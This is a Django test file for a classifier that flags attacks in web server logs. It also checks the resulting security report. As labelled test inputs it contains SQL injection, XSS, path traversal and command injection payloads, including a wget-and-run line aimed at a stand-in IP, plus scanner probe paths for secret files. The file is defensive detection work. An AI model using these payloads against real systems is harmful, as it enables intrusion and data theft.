from __future__ import annotations

from datetime import timedelta
from unittest import mock

from django.core.cache import cache
from django.test import SimpleTestCase, TestCase
from django.urls import reverse

from logs.ml import security_model
from logs.ml.security_corpus import build_corpus
from logs.ml.security_model import CLASSES, NORMAL, load_model, normalise_request
from logs.models import LogEntry
from logs.services.security import get_security_insights
from logs.services.security_classification import CONFIDENCE_THRESHOLD, classify_dataset

from .helpers import START, make_dataset, make_user, save_entries


class NormaliseRequestTests(SimpleTestCase):
    def test_decodes_lowercases_and_masks_numbers(self):
        self.assertEqual(
            normalise_request("/Item.PHP?id=4821%27%20OR%20%271%27=%271"),
            "/item.php?id=0' or '0'='0",
        )

    def test_undoes_double_encoding(self):
        self.assertEqual(normalise_request("/a?f=..%252f..%252fetc%252fpasswd"), "/a?f=../../etc/passwd")

    def test_plus_becomes_space_and_whitespace_collapses(self):
        self.assertEqual(normalise_request("/s?q=union+++select"), "/s?q=union select")

    def test_handles_empty_and_very_long_input(self):
        self.assertEqual(normalise_request(""), "")
        self.assertEqual(normalise_request(None), "")
        self.assertLessEqual(len(normalise_request("/" + "a" * 5000)), security_model.MAX_REQUEST_LENGTH)


class CorpusTests(SimpleTestCase):
    def test_corpus_is_reproducible_and_covers_every_class(self):
        first = build_corpus(seed=7, per_pattern=2, generated_normal=200)
        second = build_corpus(seed=7, per_pattern=2, generated_normal=200)
        self.assertEqual(first, second)
        self.assertEqual({label for _text, label, _group in first}, set(CLASSES))

    def test_real_normal_urls_are_included(self):
        corpus = build_corpus(per_pattern=2, generated_normal=10, real_normal=["/my/real/page.html"])
        self.assertIn(("/my/real/page.html", NORMAL, "real-0"), corpus)


class TrainedModelTests(SimpleTestCase):
    """Checks against the model file that ships with the project."""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.model, error = load_model()
        if cls.model is None:
            raise AssertionError(f"Trained model is not usable: {error}")

    def _predict(self, target: str) -> tuple[str, float]:
        probabilities = self.model.predict_proba([normalise_request(target)])[0]
        best = probabilities.argmax()
        return self.model.classes_[best], float(probabilities[best])

    def test_recognises_each_attack_class(self):
        cases = {
            "/products.php?id=5' UNION SELECT username,password FROM users--": "sqli",
            "/login.php?user=admin'%20OR%20'1'='1": "sqli",
            "/search?q=<script>alert(document.cookie)</script>": "xss",
            "/comment?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E": "xss",
            "/index.php?page=../../../../etc/passwd": "path_traversal",
            "/download?file=..%2f..%2f..%2fetc%2fshadow": "path_traversal",
            "/ping?host=127.0.0.1;cat /etc/passwd": "command_injection",
            "/cgi-bin/test?cmd=wget+http://203.0.113.9/x.sh;sh+x.sh": "command_injection",
            "/wp-login.php": "scanner_probe",
            "/.env": "scanner_probe",
            "/phpmyadmin/index.php": "scanner_probe",
        }
        for target, expected in cases.items():
            label, confidence = self._predict(target)
            self.assertEqual(label, expected, target)
            self.assertGreaterEqual(confidence, CONFIDENCE_THRESHOLD, target)

    def test_everyday_requests_are_normal(self):
        for target in (
            "/",
            "/index.html",
            "/images/logo.png",
            "/static/css/main.css?v=1.4.2",
            "/blog/2024/03/how-to-select-a-laptop/",
            "/products?category=shoes&page=2&sort=asc",
            "/api/v1/users/4821",
            "/search?q=union+station+opening+hours",
            "/articles/dynamic-dns-with-dhcp/",
            "/downloads/product_1",
            "/files/?C=M;O=D",
        ):
            label, _confidence = self._predict(target)
            self.assertEqual(label, NORMAL, target)

    def test_metadata_describes_the_shipped_model(self):
        metadata = security_model.load_metadata()
        self.assertEqual(set(metadata["examples"]), set(CLASSES))
        self.assertGreater(metadata["evaluation"]["accuracy"], 0.9)


def _entry(dataset, ip, endpoint, status=200, minute=0):
    return LogEntry(
        dataset=dataset,
        timestamp=START + timedelta(minutes=minute),
        method="GET",
        endpoint=endpoint,
        protocol="HTTP/1.1",
        status_code=status,
        ip_address=ip,
        response_size=500,
        error_flag=status >= 400,
    )


class SecurityInsightsTests(TestCase):
    """
    A small site: 300 ordinary page views, one attacker who scans for
    WordPress/admin files and then tries SQL injection, and one visitor who
    sends a single XSS attempt.
    """

    ATTACKER = "203.0.113.50"

    @classmethod
    def setUpTestData(cls):
        cls.user = make_user()
        cls.dataset = make_dataset(cls.user)
        entries = []
        pages = ["/", "/about", "/blog/first-post/", "/images/logo.png", "/products?page=2", "/contact"]
        for i in range(300):
            entries.append(_entry(cls.dataset, f"10.0.0.{i % 40 + 1}", pages[i % len(pages)], minute=i))

        probes = ["/wp-login.php", "/.env", "/phpmyadmin/index.php", "/.git/config", "/wp-admin/install.php",
                  "/administrator/index.php", "/config.php.bak", "/backup.sql", "/xmlrpc.php", "/adminer.php",
                  "/server-status", "/phpinfo.php", "/wp-config.php.bak", "/shell.php", "/actuator/env", "/.aws/credentials"]
        for i, probe in enumerate(probes):
            entries.append(_entry(cls.dataset, cls.ATTACKER, probe, status=404, minute=i))
        for i in range(6):
            entries.append(_entry(
                cls.dataset, cls.ATTACKER,
                f"/products.php?id={i}' UNION SELECT username,password FROM users--", status=200, minute=20 + i,
            ))
        entries.append(_entry(cls.dataset, "198.51.100.7", "/search?q=<script>alert(1)</script>", status=200))
        save_entries(cls.dataset, entries)

    def setUp(self):
        cache.clear()

    def test_classification_counts_requests_per_class(self):
        result = classify_dataset(self.dataset.pk, self.user)
        self.assertTrue(result["available"])
        self.assertEqual(result["requests_analysed"], 323)
        classes = {c["key"]: c for c in result["classes"]}

        self.assertEqual(classes["sqli"]["requests"], 6)
        self.assertEqual(classes["sqli"]["successful_requests"], 6)
        self.assertEqual(classes["sqli"]["top_ips"], [{"ip": self.ATTACKER, "requests": 6}])
        self.assertEqual(classes["xss"]["requests"], 1)
        self.assertEqual(classes["xss"]["unique_ips"], 1)
        self.assertGreaterEqual(classes["scanner_probe"]["requests"], 12)
        self.assertEqual(classes["scanner_probe"]["successful_requests"], 0)
        self.assertEqual(classes["command_injection"]["requests"], 0)
        # None of the 300 ordinary page views is flagged.
        self.assertLessEqual(result["flagged_requests"], 23)
        self.assertEqual(set(result["ip_classes"]), {self.ATTACKER, "198.51.100.7"})

    def test_report_blends_rules_and_classifier(self):
        report = get_security_insights(self.dataset.pk, self.user)
        by_type = {f["type"]: f for f in report["findings"]}

        self.assertEqual(by_type["sqli"]["source"], "ai")
        self.assertEqual(by_type["sqli"]["count"], 6)
        self.assertIn("answered successfully", by_type["sqli"]["description"])
        self.assertEqual(by_type["xss"]["severity"], "high")
        self.assertEqual(by_type["scanner_probe"]["source"], "ai")

        # The scanner also trips the behaviour rule (16 paths, all errors) ...
        self.assertEqual(by_type["path_scanning"]["source"], "rule")
        self.assertEqual(by_type["path_scanning"]["evidence"][0]["ip"], self.ATTACKER)
        # ... so it is reported as a repeat offender across rule and AI findings.
        offenders = by_type["multi_vector"]["evidence"]
        self.assertEqual(offenders[0]["ip"], self.ATTACKER)
        self.assertGreaterEqual(len(offenders[0]["reasons"]), 3)

        self.assertGreaterEqual(report["risk_score"], 60)
        self.assertLessEqual(report["risk_score"], 100)
        self.assertTrue(report["classification"]["available"])
        self.assertNotIn("ip_classes", report["classification"])

    def test_ordinary_heavy_visitor_is_not_a_scanner(self):
        crawler_dataset = make_dataset(self.user, "crawler.log")
        entries = [
            _entry(crawler_dataset, "66.249.66.1", f"/blog/post-{i}/", status=200, minute=i)
            for i in range(40)
        ]
        save_entries(crawler_dataset, entries)
        report = get_security_insights(crawler_dataset.pk, self.user)
        self.assertEqual(report["findings"], [])
        self.assertEqual(report["risk_score"], 0)

    def test_report_survives_a_missing_model(self):
        with mock.patch(
            "logs.services.security_classification.load_model",
            return_value=(None, "The security classifier has not been trained yet."),
        ):
            report = get_security_insights(self.dataset.pk, self.user)
        self.assertFalse(report["classification"]["available"])
        self.assertIn("not been trained", report["classification"]["note"])
        # Behaviour rules still run on their own.
        sources = {f["source"] for f in report["findings"]}
        self.assertIn("rule", sources)
        self.assertNotIn("ai", sources)

    def test_results_are_scoped_to_the_owner(self):
        stranger = make_user("stranger")
        self.assertFalse(classify_dataset(self.dataset.pk, stranger)["available"])
        self.assertEqual(get_security_insights(self.dataset.pk, stranger)["findings"], [])

    def test_endpoint_is_live_and_requires_login(self):
        url = reverse("logs:security-insights", args=[self.dataset.pk])
        self.assertEqual(self.client.get(url).status_code, 302)
        self.client.force_login(self.user)
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertIn("classification", body)
        self.assertTrue(any(f["source"] == "ai" for f in body["findings"]))
